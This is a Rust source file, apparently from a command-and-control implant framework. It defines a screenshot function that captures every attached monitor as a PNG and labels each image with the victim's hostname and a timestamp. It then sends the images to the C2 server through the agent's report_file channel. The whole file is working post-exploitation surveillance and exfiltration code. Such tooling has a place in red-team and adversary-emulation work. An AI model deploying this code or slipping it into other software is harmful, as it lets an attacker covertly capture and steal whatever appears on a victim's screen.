use alloc::string::String;
use alloc::string::ToString;
use alloc::sync::Arc;
use alloc::vec::Vec;
use chrono::Utc;
use eldritch_agent::{Agent, Context};
use image::ImageFormat;
use pb::c2::report_file_request;
use pb::{c2, eldritch};
use std::io::Cursor;
use xcap::Monitor;

pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
    let monitors = Monitor::all().map_err(|e| e.to_string())?;

    if monitors.is_empty() {
        return Err("No monitors found".to_string());
    }

    let config = agent.get_config()?;
    // Get hostname from config or default to "unknown"
    let hostname = config
        .get("hostname")
        .cloned()
        .unwrap_or_else(|| "unknown".to_string());

    let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();

    for (index, monitor) in monitors.iter().enumerate() {
        let image = monitor.capture_image().map_err(|e| e.to_string())?;

        let mut bytes: Vec<u8> = Vec::new();
        image
            .write_to(&mut Cursor::new(&mut bytes), ImageFormat::Png)
            .map_err(|e| e.to_string())?;

        let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, index);

        let metadata = eldritch::FileMetadata {
            path: filename.clone(),
            size: bytes.len() as u64,
            ..Default::default()
        };

        let file_msg = eldritch::File {
            metadata: Some(metadata),
            chunk: bytes,
        };

        let context_val = match context.clone() {
            Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
            Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
        };

        let req = c2::ReportFileRequest {
            context: context_val,
            chunk: Some(file_msg),
            kind: c2::ReportFileKind::Screenshot as i32,
        };

        let (tx, rx) = std::sync::mpsc::channel();
        tx.send(req).map_err(|e| e.to_string())?;
        drop(tx);
        agent.report_file(rx).map_err(|e| e.to_string())?;
    }

    Ok(())
}
